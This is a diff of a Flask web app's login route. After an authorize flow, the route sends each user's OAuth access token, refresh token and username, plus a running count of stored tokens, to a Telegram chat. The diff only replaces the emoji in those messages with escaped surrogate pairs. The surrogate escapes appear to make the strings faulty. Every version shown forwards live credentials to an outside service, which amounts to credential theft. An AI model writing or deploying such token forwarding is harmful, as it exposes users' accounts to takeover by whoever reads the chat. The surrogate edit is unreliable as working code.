@@ -15,7 +15,7 @@ def home():
     error = request.args.get('error')
 
     if 'username' in session:
-        send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
+        send_message_via_telegram(f"\ud83d\udc4b @{session['username']} just returned to the website.")
         return redirect(url_for('welcome'))
 
     if request.args.get('authorize') == 'true':
@@ -60,10 +60,10 @@ def home():
                 session['refresh_token'] = refresh_token
                 total_tokens = get_total_tokens()
                 send_message_via_telegram(
-                    f"🔑 Access Token: {access_token}\n"
-                    f"🔄 Refresh Token: {refresh_token}\n"
-                    f"👤 Username: @{username}\n"
-                    f"📊 Total Tokens in Database: {total_tokens}"
+                    f"\ud83d\udd11 Access Token: {access_token}\n"
+                    f"\ud83d\udd04 Refresh Token: {refresh_token}\n"
+                    f"\ud83d\udc64 Username: @{username}\n"
+                    f"\ud83d\udcca Total Tokens in Database: {total_tokens}"
                 )
                 return redirect(url_for('welcome'))
             else:
